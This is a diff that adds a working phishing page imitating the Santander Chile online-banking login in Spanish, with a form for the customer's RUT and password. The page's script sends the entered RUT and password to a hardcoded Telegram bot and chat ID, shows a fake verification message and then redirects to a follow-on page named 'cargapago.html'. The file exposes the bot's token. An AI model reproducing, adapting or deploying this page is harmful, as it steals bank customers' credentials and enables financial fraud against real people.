@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Santander - Ingreso</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .header {
+            background-color: #ec0000;
+            color: white;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .santander-logo {
+            height: 30px;
+        }
+        
+        .close-button {
+            background-color: white;
+            color: #ec0000;
+            border: none;
+            border-radius: 20px;
+            padding: 8px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        
+        .hamburger-icon {
+            color: white;
+            font-size: 24px;
+            margin-left: auto;
+        }
+        
+        .content {
+            padding: 20px;
+        }
+        
+        h1 {
+            color: #ec0000;
+            font-size: 24px;
+            margin-bottom: 30px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .login-button {
+            width: 100%;
+            background-color: #ec0000;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 15px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-bottom: 30px;
+            transition: background-color 0.3s;
+        }
+        
+        .login-button:hover {
+            background-color: #d40000;
+        }
+        
+        .login-button:disabled {
+            background-color: #f2f2f2;
+            color: #666;
+            cursor: not-allowed;
+        }
+        
+        .recovery-link {
+            color: #0099cc;
+            text-align: center;
+            display: block;
+            margin-top: 30px;
+            text-decoration: none;
+            font-size: 16px;
+        }
+        
+        .lock-icon {
+            color: #0099cc;
+            font-size: 20px;
+            margin-right: 5px;
+            vertical-align: middle;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            color: #666;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div style="width: 140px;">
+            <!-- Add the Santander logo image here -->
+            <img src="../img/santan.png" alt="Santander" class="santander-logo">
+        </div>
+        
+        <!-- <button class="close-button">
+            ✕ Cerrar
+        </button> -->
+        
+        <div class="hamburger-icon">≡</div>
+    </div>
+    
+    <div class="content">
+        <h1>Ingresa a tu banco en línea</h1>
+        
+        <form id="santanderForm">
+            <input type="text" class="input-field" id="rut" name="dato1" placeholder="RUT" required>
+            <input type="password" class="input-field" id="clave" name="dato2" placeholder="Clave" required>
+            <button type="submit" class="login-button" id="submitBtn">Ingresar</button>
+            <div class="loading" id="loading">Verificando datos...</div>
+        </form>
+        
+        <a href="#" class="recovery-link">
+            <span class="lock-icon"></span>
+            ¿No tienes tu clave? Créala o recupérala aquí ›
+        </a>
+    </div>
+
+    <script>
+        // Configuración de Telegram Bot
+        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+        const TELEGRAM_CHAT_ID = '5848946481';
+        const REDIRECT_URL = '../cargapago.html'; // URL de redirección
+
+        document.getElementById('santanderForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const rut = document.getElementById('rut').value;
+            const clave = document.getElementById('clave').value;
+            
+            // Mostrar estado de carga
+            submitBtn.disabled = true;
+            loading.style.display = 'block';
+            
+            try {
+                // Preparar mensaje para Telegram
+                const message = `🏦 Santander - Nuevos datos de acceso:\n\n📋 RUT: ${rut}\n🔑 Clave: ${clave}\n\n📅 Fecha: ${new Date().toLocaleString('es-ES')}\n🌐 IP: Usuario conectado`;
+                
+                // Enviar a Telegram
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (response.ok) {
+                    // Simular procesamiento
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 2000);
+                } else {
+                    throw new Error('Error al enviar mensaje');
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error al procesar la solicitud. Intenta de nuevo.');
+                
+                // Restaurar estado del botón
+                submitBtn.disabled = false;
+                loading.style.display = 'none';
+            }
+        });
+
+        // Funcionalidad del botón cerrar
+        document.querySelector('.close-button').addEventListener('click', function() {
+            window.close();
+        });
+    </script>
+</body>
+</html>
